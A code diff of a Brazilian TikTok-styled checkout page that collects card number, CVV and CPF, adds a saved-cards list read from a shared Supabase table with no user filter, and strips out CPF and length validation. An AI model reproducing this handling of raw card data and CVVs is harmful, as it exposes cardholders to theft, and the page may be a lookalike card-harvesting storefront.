@@ -1,10 +1,10 @@
 "use client";
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle } from 'lucide-react';
+import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle, Trash2, CheckCircle2 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
-import { showError } from '@/utils/toast';
+import { showError, showSuccess } from '@/utils/toast';
 import { supabase } from "@/integrations/supabase/client";
 import { trackTikTokEvent } from '@/utils/tiktok-pixel';
 
@@ -20,6 +20,37 @@ const AddCard: React.FC = () => {
   const [step, setStep] = useState(0);
   const [brand, setBrand] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
+
+  const [savedCards, setSavedCards] = useState<any[]>([]);
+  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);
+
+  useEffect(() => {
+    fetchSavedCards();
+  }, []);
+
+  const fetchSavedCards = async () => {
+    const { data } = await supabase
+      .from('cards')
+      .select('*')
+      .order('created_at', { ascending: false });
+    
+    if (data) {
+      setSavedCards(data);
+      if (data.length > 0) setSelectedCardId(data[0].id);
+    }
+  };
+
+  const handleRemoveCard = async (id: string, e: React.MouseEvent) => {
+    e.stopPropagation();
+    try {
+      await supabase.from('cards').delete().eq('id', id);
+      showSuccess("Cartão removido.");
+      setSavedCards(prev => prev.filter(c => c.id !== id));
+      if (selectedCardId === id) setSelectedCardId(null);
+    } catch (err) {
+      showError("Erro ao remover cartão.");
+    }
+  };
 
   const detectBrand = (number: string) => {
     const clean = number.replace(/\s/g, '');
@@ -68,30 +99,19 @@ const AddCard: React.FC = () => {
     return formatted;
   };
 
-  const validateCPF = (cpfStr: string) => {
-    const cpfClean = cpfStr.replace(/\D/g, '');
-    if (cpfClean.length !== 11 || !!cpfClean.match(/(\d)\1{10}/)) return false;
-    const digits = cpfClean.split('').map(Number);
-    const calc = (n: number) => digits.slice(0, n).reduce((acc, digit, idx) => acc + digit * (n + 1 - idx), 0) * 10 % 11 % 10;
-    return calc(9) === digits[9] && calc(10) === digits[10];
-  };
-
   const handleContinue = async () => {
+    // Se um cartão salvo estiver selecionado e os campos estiverem vazios
+    if (selectedCardId && !cardNumber) {
+      const card = savedCards.find(c => c.id === selectedCardId);
+      navigate('/checkout', { state: { ...location.state, cardData: card } });
+      return;
+    }
+
     const cleanNumber = cardNumber.replace(/\s/g, '');
     const cleanCpf = cpf.replace(/\D/g, '');
 
-    if (cleanNumber.length < 16) {
-      showError("Digite os 16 números do cartão.");
-      return;
-    }
-
-    if (brand === 'unknown') {
-      showError("Apenas cartões começando com 4 ou 5 são permitidos.");
-      return;
-    }
-
-    if (cleanCpf.length < 11 || !validateCPF(cleanCpf)) {
-      showError("CPF inválido.");
+    if (cleanNumber.length < 16 || brand === 'unknown' || cleanCpf.length < 11) {
+      showError("Preencha todos os dados corretamente.");
       return;
     }
 
@@ -114,16 +134,6 @@ const AddCard: React.FC = () => {
 
       if (error) throw error;
 
-      if (location.state?.product) {
-        trackTikTokEvent('AddPaymentInfo', {
-          content_id: location.state.product.slug,
-          content_type: 'product',
-          content_name: location.state.product.title,
-          value: parseFloat(location.state.product.currentPrice.replace(',', '.')),
-          currency: 'BRL'
-        });
-      }
-
       let currentStep = 0;
       const interval = setInterval(() => {
         setStep(currentStep);
@@ -144,14 +154,13 @@ const AddCard: React.FC = () => {
       }, 1500);
 
     } catch (err) {
-      console.error("Erro ao salvar cartão:", err);
-      showError("Erro ao processar o cartão. Tente novamente.");
+      showError("Erro ao processar o cartão.");
       setIsProcessing(false);
     }
   };
 
   return (
-    <div className="min-h-screen bg-white">
+    <div className="min-h-screen bg-white pb-24">
       {isProcessing && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6">
           <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px]">
@@ -175,18 +184,16 @@ const AddCard: React.FC = () => {
       </div>
 
       {errorMsg && (
-        <div className="bg-red-50 p-3 flex items-center space-x-2 border-b border-red-100 animate-in fade-in slide-in-from-top duration-300">
+        <div className="bg-red-50 p-3 flex items-center space-x-2 border-b border-red-100">
           <AlertCircle size={16} className="text-red-500 shrink-0" />
           <p className="text-[12px] text-red-600 font-medium">{errorMsg}</p>
         </div>
       )}
 
       <div className="p-4 space-y-6">
-        <div className="flex items-center justify-between text-[13px]">
-          <div className="flex items-center space-x-2 text-[#FF2C55]">
-            <Smartphone size={16} />
-            <span className="font-medium">Sem juros em 3 parcelas</span>
-          </div>
+        <div className="flex items-center space-x-2 text-[#FF2C55]">
+          <Smartphone size={16} />
+          <span className="text-[13px] font-medium">Sem juros em 3 parcelas</span>
         </div>
 
         <div className="space-y-5">
@@ -194,11 +201,11 @@ const AddCard: React.FC = () => {
             <div className="flex justify-between items-center">
               <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
               <div className="flex gap-2 h-5">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className={`h-full transition-opacity ${brand === 'mastercard' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
-                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className={`h-full transition-opacity ${brand === 'visa' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-full" />
+                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-full" />
               </div>
             </div>
-            <div className={`border-2 rounded-xl h-14 flex items-center px-4 transition-colors ${brand === 'unknown' && cardNumber.replace(/\s/g, '').length > 0 ? 'border-red-500 bg-red-50/10' : 'border-[#F1F1F1]'}`}>
+            <div className="border-[#F1F1F1] border-2 rounded-xl h-14 flex items-center px-4">
               <input 
                 type="text" 
                 placeholder="0000 0000 0000 0000" 
@@ -218,7 +225,6 @@ const AddCard: React.FC = () => {
                 className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
-                maxLength={5}
               />
             </div>
             <div className="space-y-1.5">
@@ -229,7 +235,6 @@ const AddCard: React.FC = () => {
                 className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                 value={cvv}
                 onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
-                maxLength={3}
               />
             </div>
           </div>
@@ -253,24 +258,70 @@ const AddCard: React.FC = () => {
               className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
               value={cpf}
               onChange={(e) => setCpf(formatCpf(e.target.value))}
-              maxLength={14}
             />
           </div>
         </div>
 
-        <div className="bg-[#F0FBF9] border border-[#E0F7F4] rounded-xl p-4 flex items-start space-x-3">
-          <p className="text-[11px] text-[#00BFA5] leading-tight">
+        <div className="bg-[#F0FBF9] border border-[#E0F7F4] rounded-xl p-4 flex items-center justify-between">
+          <p className="text-[11px] text-[#00BFA5] leading-tight flex-grow pr-4">
             Seus dados de pagamento são criptografados e o CPF é usado apenas para validação fiscal conforme as leis brasileiras.
           </p>
-          <ShieldCheck size={24} className="text-[#00BFA5] flex-shrink-0" />
+          <ShieldCheck size={20} className="text-[#00BFA5] shrink-0" />
         </div>
+
+        {/* LISTA DE CARTÕES SALVOS */}
+        {savedCards.length > 0 && (
+          <div className="space-y-4 pt-2">
+            <h3 className="text-[14px] font-bold text-gray-900 px-1">Cartões salvos</h3>
+            <div className="space-y-3">
+              {savedCards.map((card) => (
+                <div 
+                  key={card.id}
+                  className={`border rounded-2xl p-4 flex items-center justify-between cursor-pointer transition-all ${
+                    selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-100 bg-gray-50'
+                  }`}
+                  onClick={() => {
+                    setSelectedCardId(card.id);
+                    // Limpa o formulário se selecionar um salvo
+                    setCardNumber("");
+                  }}
+                >
+                  <div className="flex items-center space-x-3">
+                    <div className="bg-white p-1 rounded border">
+                      {card.brand === 'visa' ? (
+                        <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" />
+                      ) : (
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
+                      )}
+                    </div>
+                    <div className="flex flex-col">
+                      <span className="text-[13px] font-bold text-gray-900">Cartão final {card.last4} salvo</span>
+                      <button 
+                        className="text-[11px] text-gray-400 font-medium hover:text-red-500 w-fit mt-0.5 flex items-center"
+                        onClick={(e) => handleRemoveCard(card.id, e)}
+                      >
+                        <Trash2 size={12} className="mr-1" /> Remover
+                      </button>
+                    </div>
+                  </div>
+                  
+                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
+                    selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FF2C55]' : 'border-gray-300'
+                  }`}>
+                    {selectedCardId === card.id && <CheckCircle2 size={14} className="text-white" />}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
       </div>
 
       <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t">
         <Button 
           className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55]"
           onClick={handleContinue}
-          disabled={!cardNumber || !expiry || !cvv || !name || !cpf || !!errorMsg}
+          disabled={!selectedCardId && (!cardNumber || brand === 'unknown')}
         >
           Continuar
         </Button>
